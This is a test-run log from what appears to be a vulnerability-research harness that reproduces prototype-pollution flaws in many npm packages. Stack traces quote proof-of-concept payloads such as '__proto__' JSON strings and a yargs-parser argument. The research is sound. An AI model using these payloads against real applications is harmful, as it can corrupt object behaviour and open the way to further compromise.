Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.084 s
Ran all test suites matching /getobject_0.1.0\/getobject.test.js/i.
b"Loaded babel plugin\n  console.log\n    Before  : undefined\n\n      at Object.<anonymous> (getobject_0.1.0/getobject.test.js:7:11)\n\n  console.log\n    [ 'get', 'set', 'exists' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 3, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/rdf-graph-array_0.3.0/rdf-graph-array.test.js']
PASS rdf-graph-array_0.3.0/rdf-graph-array.test.js
  ✓ prototype pollution in rdf-graph-array (239 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.262 s
Ran all test suites matching /rdf-graph-array_0.3.0\/rdf-graph-array.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'encodeString',\n      'AbstractGraph',\n      'NamedNode',\n      'BlankNode',\n      'Literal',\n      'Triple',\n      'Quad',\n      'Graph'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'Graph' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/dset_1.0.0/dset.test.js']
PASS dset_1.0.0/dset.test.js
  ✓ prototype pollution in dset (37 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.059 s
Ran all test suites matching /dset_1.0.0\/dset.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/lutils_2.4.0/lutils.test.js']
PASS lutils_2.4.0/lutils.test.js
  ✓ prototype pollution in lutils (191 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.196 s
Ran all test suites matching /lutils_2.4.0\/lutils.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'Merge',       'MergeWhite',\n      'MergeBlack',  'merge',\n      'Clone',       'clone',\n      'isBoolean',   'isNull',\n      'isUndefined', 'isString',\n      'isNumber',    'isSymbol',\n      'isFunction',  'isArray',\n      'isObject',    'isRegExp',\n      'isDate',      'typeOf'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'merge' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 6\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/merge-options_1.0.0/merge-options.test.js']
FAIL merge-options_1.0.0/merge-options.test.js
  ✕ prototype pollution in merge-options (91 ms)

  ● prototype pollution in merge-options

    ReferenceError: obj is not defined

      3 |   const merge = require("merge-options");
      4 |   const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (merge-options_1.0.0/merge-options.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.064 s
Ran all test suites matching /merge-options_1.0.0\/merge-options.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'merge-options_1.0.0/merge-options.test.js']' returned non-zero exit status 1.
['../prototype-pollution/tsed-core_5.62.3/tsed-core.test.js']
FAIL tsed-core_5.62.3/tsed-core.test.js
  ✕ prototype pollution in @tsed/core (206 ms)

  ● prototype pollution in @tsed/core

    TypeError: pushFct(...) is not a function

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at node_modules/reflect-metadata/Reflect.js:19:5
      at Object.<anonymous> (node_modules/reflect-metadata/Reflect.js:16:1)
      at Object.<anonymous> (node_modules/@tsed/core/src/index.ts:4:1)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in @tsed/core

    TypeError: deepExtends is not a function

       9 |   expect({}.polluted).toBe(undefined);
      10 | 
    > 11 |   let result = deepExtends({ security: [{ 1: "o" }] }, payload);
         |                ^
      12 |   expect({}.polluted).toBe("yes");
      13 | });
      14 | 

      at Object.<anonymous> (tsed-core_5.62.3/tsed-core.test.js:11:16)

  ● prototype pollution in @tsed/core

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.262 s
Ran all test suites matching /tsed-core_5.62.3\/tsed-core.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'tsed-core_5.62.3/tsed-core.test.js']' returned non-zero exit status 1.
['../prototype-pollution/deep-extend_0.5.0/deep-extend.test.js']
FAIL deep-extend_0.5.0/deep-extend.test.js
  ✕ prototype pollution in merge-objects (64 ms)

  ● prototype pollution in merge-objects

    ReferenceError: obj is not defined

      3 |   const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
      4 | 
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (deep-extend_0.5.0/deep-extend.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.077 s
Ran all test suites matching /deep-extend_0.5.0\/deep-extend.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'deep-extend_0.5.0/deep-extend.test.js']' returned non-zero exit status 1.
['../prototype-pollution/deap_1.0.0/deap.test.js']
FAIL deap_1.0.0/deap.test.js
  ✕ prototype pollution in deap (101 ms)

  ● prototype pollution in deap

    ReferenceError: obj is not defined

      2 | test("prototype pollution in deap", () => {
      3 |   const deap = require("deap");
    > 4 |   obj = {};
        |      ^
      5 |   let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
      6 | 
      7 |   expect({}.polluted).toBe(undefined);

      at Object.<anonymous> (deap_1.0.0/deap.test.js:4:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.122 s
Ran all test suites matching /deap_1.0.0\/deap.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'deap_1.0.0/deap.test.js']' returned non-zero exit status 1.
['../prototype-pollution/multi-ini_2.1.0/multi-ini.test.js']
PASS multi-ini_2.1.0/multi-ini.test.js
  ✓ prototype pollution in multi-ini (263 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.306 s
Ran all test suites matching /multi-ini_2.1.0\/multi-ini.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'read', 'write', 'filters', 'Class', 'Parser', 'Serializer' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'read' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/merge-change_1.0.1/merge-change.test.js']
FAIL merge-change_1.0.1/merge-change.test.js
  ✕ prototype pollution in merge-change (78 ms)

  ● prototype pollution in merge-change

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/merge-change/merge-change.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in merge-change

    TypeError: Cannot read properties of undefined (reading 'set')

       6 | 
       7 |   let obj = {};
    >  8 |   utils.set(obj, ["__proto__", "polluted"], "yes");
         |         ^
       9 | 
      10 |   expect({}.polluted).toBe("yes");
      11 | });

      at Object.<anonymous> (merge-change_1.0.1/merge-change.test.js:8:9)

  ● prototype pollution in merge-change

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.131 s
Ran all test suites matching /merge-change_1.0.1\/merge-change.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'merge-change_1.0.1/merge-change.test.js']' returned non-zero exit status 1.
['../prototype-pollution/querymen_2.1.3/querymen.test.js']
FAIL querymen_2.1.3/querymen.test.js
  ✕ prototype pollution in querymen (242 ms)

  ● prototype pollution in querymen

    ReferenceError: obj is not defined

      2 | test("prototype pollution in querymen", () => {
      3 |   var a = require("querymen");
    > 4 |   obj = {};
        |      ^
      5 | 
      6 |   expect({}.polluted).toBe(undefined);
      7 | 

      at Object.<anonymous> (querymen_2.1.3/querymen.test.js:4:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.273 s
Ran all test suites matching /querymen_2.1.3\/querymen.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'querymen_2.1.3/querymen.test.js']' returned non-zero exit status 1.
['../prototype-pollution/yargs-parser_6.0.0/yargs-parser.test.js']
FAIL yargs-parser_6.0.0/yargs-parser.test.js
  ✕ prototype pollution in yargs-parser (194 ms)

  ● prototype pollution in yargs-parser

    Jest encountered an unexpected token

    This usually means that you are trying to import a file which Jest cannot parse, e.g. it's not plain JavaScript.

    By default, if Jest sees a Babel config, it will use that to transform your files, ignoring "node_modules".

    Here's what you can do:
     • If you are trying to use ECMAScript Modules, see https://jestjs.io/docs/en/ecmascript-modules for how to enable it.
     • To have some of your "node_modules" files transformed, you can specify a custom "transformIgnorePatterns" in your config.
     • If you need a custom transformation specify a "transform" option in your config.
     • If you simply want to mock your non-JS modules (e.g. binary assets) you can stub them out with the "moduleNameMapper" config option.

    You'll find more details and examples of these config options in the docs:
    https://jestjs.io/docs/en/configuration.html

    Details:

    /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/yargs-parser/index.js:712
        [].concat(flags.aliases[key] || [], key).forEach(function (k) {
         ^

    SyntaxError: Unexpected token ']'

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at Runtime.createScriptFromCode (../node_modules/jest-runtime/build/index.js:1350:14)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in yargs-parser

    TypeError: parser is not a function

       6 |   const parser = require("yargs-parser");
       7 | 
    >  8 |   parser("--foo.__proto__.polluted yes");
         |   ^
       9 | 
      10 |   expect({}.polluted).toBe("yes");
      11 | });

      at Object.<anonymous> (yargs-parser_6.0.0/yargs-parser.test.js:8:3)

  ● prototype pollution in yargs-parser

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.243 s
Ran all test suites matching /yargs-parser_6.0.0\/yargs-parser.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'yargs-parser_6.0.0/yargs-parser.test.js']' returned non-zero exit status 1.
['../prototype-pollution/immer_8.0.0/immer.test.js']
PASS immer_8.0.0/immer.test.js
  ✓ prototype pollution in immer (456 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.49 s
Ran all test suites matching /immer_8.0.0\/immer.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'Immer',         'applyPatches',\n      'castDraft',     'castImmutable',\n      'createDraft',   'current',\n      'default',       'enableAllPlugins',\n      'enableES5',     'enableMapSet',\n      'enablePatches', 'finishDraft',\n      'freeze',        'immerable',\n      'isDraft',       'isDraftable',\n      'nothing',       'original',\n      'produce',       'produceWithPatches',\n      'setAutoFreeze', 'setUseProxies'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'applyPatches', 'enablePatches' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 6\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/dot-object_2.1.2/dot-object.test.js']
PASS dot-object_2.1.2/dot-object.test.js
  ✓ prototype pollution in dot-object  (129 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.248 s
Ran all test suites matching /dot-object_2.1.2\/dot-object.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'pick',     'move',\n      'transfer', 'transform',\n      'copy',     'object',\n      'str',      'set',\n      'delete',   'remove',\n      'del',      'dot',\n      '_process', 'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/dot-notes_3.2.0/dot-notes.test.js']
PASS dot-notes_3.2.0/dot-notes.test.js
  ✓ prototype pollution in dot-notes (155 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.176 s
Ran all test suites matching /dot-notes_3.2.0\/dot-notes.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'create',\n      'escape',\n      'isEscaped',\n      'get',\n      'join',\n      'keys',\n      'recurse',\n      'ParseException'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'create' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/safe-object2_1.0.3/safe-object2.test.js']
FAIL safe-object2_1.0.3/safe-object2.test.js
  ✕ prototype pollution in safe-object2 (48 ms)

  ● prototype pollution in safe-object2

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/safe-object2/lib/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in safe-object2

    TypeError: safeObj2 is not a function

      2 | test("prototype pollution in safe-object2", () => {
      3 |   const safeObj2 = require("safe-object2");
    > 4 |   const obj = safeObj2({});
        |               ^
      5 | 
      6 |   expect({}.polluted).toBe(undefined);
      7 | 

      at Object.<anonymous> (safe-object2_1.0.3/safe-object2.test.js:4:15)

  ● prototype pollution in safe-object2

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.078 s
Ran all test suites matching /safe-object2_1.0.3\/safe-object2.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'safe-object2_1.0.3/safe-object2.test.js']' returned non-zero exit status 1.
['../prototype-pollution/nis-utils_0.6.10/nis-utils.test.js']
FAIL nis-utils_0.6.10/nis-utils.test.js
  ✕ prototype pollution in nis-utils (2392 ms)

  ● prototype pollution in nis-utils

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/debug/src/common.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in nis-utils

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        3.442 s
Ran all test suites matching /nis-utils_0.6.10\/nis-utils.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'nis-utils_0.6.10/nis-utils.test.js']' returned non-zero exit status 1.
['../prototype-pollution/promisehelpers_0.0.5/promisehelpers.test.js']
FAIL promisehelpers_0.0.5/promisehelpers.test.js
  ✕ prototype pollution in promisehelpers (63 ms)

  ● prototype pollution in promisehelpers

    ReferenceError: obj is not defined

      2 | test("prototype pollution in promisehelpers", () => {
      3 |   const promisehelpers = require("promisehelpers");
    > 4 |   obj = {};
        |      ^
      5 | 
      6 |   expect({}.polluted).toBe(undefined);
      7 | 

      at Object.<anonymous> (promisehelpers_0.0.5/promisehelpers.test.js:4:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.199 s
Ran all test suites matching /promisehelpers_0.0.5\/promisehelpers.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'promisehelpers_0.0.5/promisehelpers.test.js']' returned non-zero exit status 1.
['../prototype-pollution/defaults-deep_0.2.0/defaults-deep.test.js']
PASS defaults-deep_0.2.0/defaults-deep.test.js
  ✓ prototype pollution in defaults-deep  (61 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.086 s
Ran all test suites matching /defaults-deep_0.2.0\/defaults-deep.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 9\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/deeps_1.4.5/deeps.test.js']
PASS deeps_1.4.5/deeps.test.js
  ✓ prototype pollution in deeps (116 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.213 s
Ran all test suites matching /deeps_1.4.5\/deeps.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'get',       'set',\n      'diff',      'keys',\n      'merge',     'values',\n      'flatten',   'expand',\n      'collapse',  'isObject',\n      'unflatten', 'mapToProps'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/sds_3.2.0/sds.test.js']
FAIL sds_3.2.0/sds.test.js
  ✕ prototype pollution in sds (379 ms)

  ● prototype pollution in sds

    ReferenceError: obj is not defined

      3 |   const root = require("sds");
      4 | 
    > 5 |   obj = {};
        |      ^
      6 |   let payload = "__proto__.polluted";
      7 | 
      8 |   expect({}.polluted).toBe(undefined);

      at Object.<anonymous> (sds_3.2.0/sds.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.407 s
Ran all test suites matching /sds_3.2.0\/sds.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'sds_3.2.0/sds.test.js']' returned non-zero exit status 1.
['../prototype-pollution/ts-nodash_1.2.1/ts-nodash.test.js']
PASS ts-nodash_1.2.1/ts-nodash.test.js
  ✓ prototype pollution in ts-nodash (195 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.231 s
Ran all test suites matching /ts-nodash_1.2.1\/ts-nodash.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'Compare',\n      'DateFormat',\n      'Decision',\n      'FetchContext',\n      'Merge',\n      'PruneContext',\n      'PutContext',\n      'default'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'Merge' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/connie_0.1.0/connie.test.js']
PASS connie_0.1.0/connie.test.js
  ✓ prototype pollution in connie (1558 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.799 s
Ran all test suites matching /connie_0.1.0\/connie.test.js/i.
